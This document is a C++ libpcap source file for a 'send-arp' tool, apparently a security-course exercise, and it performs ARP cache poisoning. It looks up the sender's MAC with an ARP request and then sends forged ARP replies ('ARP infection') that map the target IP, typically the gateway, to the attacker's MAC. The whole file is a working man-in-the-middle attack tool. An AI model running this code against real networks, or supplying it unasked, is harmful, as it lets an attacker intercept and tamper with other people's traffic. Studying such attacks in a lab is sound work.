#include <cstdio>
#include <pcap.h>
#include <cstdlib>
#include <cstring>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool getMacAddress(const std::string& interfaceName, Mac& myMacAddress) {
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    	if (sockfd == -1) {
    	    	perror("socket");
        	return false;
    	}

    	struct ifreq ifr;
    	std::memset(&ifr, 0, sizeof(ifr));
    	std::strcpy(ifr.ifr_name, interfaceName.c_str());

    	if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
        	perror("ioctl");
        	close(sockfd);
        	return false;
    	}

    	close(sockfd);

    	unsigned char* macPtr = reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data);
    	myMacAddress = Mac(macPtr);

    	return true;
}

bool getIpAddress(const std::string& interfaceName, Ip& myIpAddress) {
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd == -1) {
		perror("socket");
		return false;
	}

	struct ifreq ifr;
	std::memset(&ifr, 0, sizeof(ifr));
	std::strcpy(ifr.ifr_name, interfaceName.c_str());
	ifr.ifr_addr.sa_family = AF_INET;

	if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
		perror("ioctl");
		close(sockfd);
		return false;
	}

	close(sockfd);

	myIpAddress = ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr);
    	return true;
}

bool sendArpRequest(pcap_t* handle, const Mac& myMacAddress, const Ip& myIpAddress, const Ip& senderIp) {
    	EthArpPacket packet;

    	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    	packet.eth_.smac_ = myMacAddress;
    	packet.eth_.type_ = htons(EthHdr::Arp);

    	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    	packet.arp_.pro_ = htons(EthHdr::Ip4);
    	packet.arp_.hln_ = Mac::SIZE;
    	packet.arp_.pln_ = Ip::SIZE;
    	packet.arp_.op_ = htons(ArpHdr::Request);
    	packet.arp_.smac_ = myMacAddress;
    	packet.arp_.sip_ = htonl(myIpAddress);
    	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    	packet.arp_.tip_ = htonl(senderIp);

    	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    	return (res == 0);
}

bool sendArpInfection(pcap_t* handle, const Mac& myMacAddress, const Mac& senderMac, const Ip& targetIp, const Ip& senderIp) {
    	EthArpPacket packet;

    	packet.eth_.dmac_ = senderMac;
    	packet.eth_.smac_ = myMacAddress;
    	packet.eth_.type_ = htons(EthHdr::Arp);

    	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    	packet.arp_.pro_ = htons(EthHdr::Ip4);
    	packet.arp_.hln_ = Mac::SIZE;
    	packet.arp_.pln_ = Ip::SIZE;
    	packet.arp_.op_ = htons(ArpHdr::Reply);
    	packet.arp_.smac_ = myMacAddress;
    	packet.arp_.sip_ = htonl(targetIp);
    	packet.arp_.tmac_ = senderMac;
    	packet.arp_.tip_ = htonl(senderIp);

    	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    	return (res == 0);
}

int main(int argc, char* argv[]) {
	
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Mac myMacAddress;
    	if (!getMacAddress(dev, myMacAddress)) {
        	fprintf(stderr, "failed to get MAC address of %s\n", dev);
        	pcap_close(handle);
        	return -1;
	}

	Ip myIpAddress;
	if (!getIpAddress(dev, myIpAddress)) {
		fprintf(stderr, "failed to get IP address of %s\n", dev);
		pcap_close(handle);
		return -1;
	}

	printf("My MAC Address: %s\n", myMacAddress.operator std::string().c_str());
	printf("My IP Address: %s\n", myIpAddress.operator std::string().c_str());

	for (int i = 2; i < argc; i += 2) {
        	Ip senderIp = Ip(argv[i]);
        	Ip targetIp = Ip(argv[i + 1]);

        	Mac senderMac;
        	if (!sendArpRequest(handle, myMacAddress, myIpAddress, senderIp)) {
		       	printf("failed to send arp request\n");
		}

		struct pcap_pkthdr* header;
  		const uint8_t* packet;
  		while (true) {
    			int res = pcap_next_ex(handle, &header, &packet);
    			if (res == 0) continue;
    			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
      				printf("ERROR: pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
      				break;
    			}

    			EthHdr* ethHeader = (struct EthHdr*)packet;

    			if (ethHeader->type() != EthHdr::Arp) {
      				continue;
    			}

    			ArpHdr* arpHeader = (struct ArpHdr*)(packet + sizeof(EthHdr));

    			if (arpHeader->hrd() != ArpHdr::ETHER ||arpHeader->pro() != EthHdr::Ip4 || arpHeader->op() != ArpHdr::Reply) {
      				continue;
    			}

			if (arpHeader->tmac() == myMacAddress && arpHeader->tip() == myIpAddress && arpHeader->sip() == senderIp) {
      				senderMac = arpHeader->smac();
      				break;
    			}
  		}

        	printf("Sender IP: %s, Sender MAC: %s\n", senderIp.operator std::string().c_str(), senderMac.operator std::string().c_str());

        	if (!sendArpInfection(handle, myMacAddress, senderMac, targetIp, senderIp)) {
            		fprintf(stderr, "failed to send ARP infection to sender(%s)\n", senderIp.operator std::string().c_str());
        	} else {
            		printf("ARP infection sent to Sender(%s)\n", senderIp.operator std::string().c_str());
        	}
    	}

	pcap_close(handle);
	return 0;
}
